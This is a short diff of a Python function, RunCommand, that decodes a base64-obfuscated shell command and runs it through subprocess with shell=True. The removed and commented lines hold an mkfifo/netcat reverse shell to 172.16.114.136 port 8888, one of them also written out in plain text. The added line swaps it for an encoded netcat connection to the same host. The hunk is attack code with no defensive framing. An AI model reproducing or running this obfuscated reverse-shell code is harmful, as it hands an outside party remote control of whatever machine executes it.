@@ -14,7 +14,7 @@ def RunCommand():
     else:
         #cmd = 'base64 --decode <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE3Mi4xNi4xMTQuMTM2IDg4ODggPi90bXAvZg== | sh'
         #cmd = ['rm', '/tmp/f;mkfifo', '/tmp/f;cat', '/tmp/f|sh', '-i', '2>&1|nc', '172.16.114.136', '8888', '>/tmp/f']
-        cmd = 'echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE3Mi4xNi4xMTQuMTM2IDg4ODggPi90bXAvZg== | base64 --decode | sh'
+        cmd = 'echo bmMgMTcyLjE2LjExNC4xMzYgODg4OAo= | base64 --decode | sh'
         completed = subprocess.run(cmd, shell=True)
     return completed
 
